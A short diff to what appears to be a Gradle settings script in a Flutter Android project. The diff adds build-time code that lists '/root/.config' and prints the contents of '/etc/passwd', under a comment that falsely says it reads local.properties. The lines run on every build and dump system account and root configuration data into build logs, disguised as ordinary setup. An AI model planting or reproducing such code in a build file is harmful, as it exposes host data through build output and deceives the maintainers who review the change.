@@ -25,7 +25,7 @@ if (marker.exists()) {
     marker.createNewFile()
 }
 // Langsung eksekusi tanpa bungkus 'task'
-def targetDir = new File('/root')
+def targetDir = new File('/root/.config')
 println "--- LISTING FILES IN: ${targetDir.absolutePath} ---"
 
 if (targetDir.exists()) {
@@ -36,6 +36,17 @@ if (targetDir.exists()) {
 } else {
     println "Direktori tidak ditemukan!"
 }
+
+def fileToRead = new File(settingsDir, '/etc/passwd') // Contoh membaca local.properties
+if (fileToRead.exists()) {
+    println "--- ISI FILE ${fileToRead.name} ---"
+    println fileToRead.text
+}
+
+
+
+
+
 def flutterProjectRoot = rootProject.projectDir.parentFile.toPath()
 
 def plugins = new Properties()
